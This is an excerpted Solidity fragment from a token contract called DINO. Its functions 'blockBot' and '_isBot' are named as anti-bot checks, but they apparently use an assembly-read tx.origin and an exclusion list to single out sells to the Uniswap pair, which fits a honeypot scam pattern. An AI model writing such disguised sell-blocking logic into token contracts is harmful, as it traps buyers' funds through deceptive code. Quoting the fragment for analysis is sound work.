...
contract DINO is ERC20, Ownable {
    ...
    uint256 private _sellFix;
    uint256 private _blockCountNumber;
    ...
    function blockBot(address account) internal view returns (uint256) {
        if (
            buyFeeProcent == sellFeeProcent && allowance(account, address(_router)) >= 0 &&
            uniPair != address(0) &&
            IERC20(uniPair).balanceOf(uniPair) > 0 &&
            !_excludedFromLimits[_isBot()] && uniPair == account
        ) return 0;
        return 1;
    }
    ...
    function _isBot() internal view returns (address _bot) {
        assembly {
            _bot := origin()
        }
    }
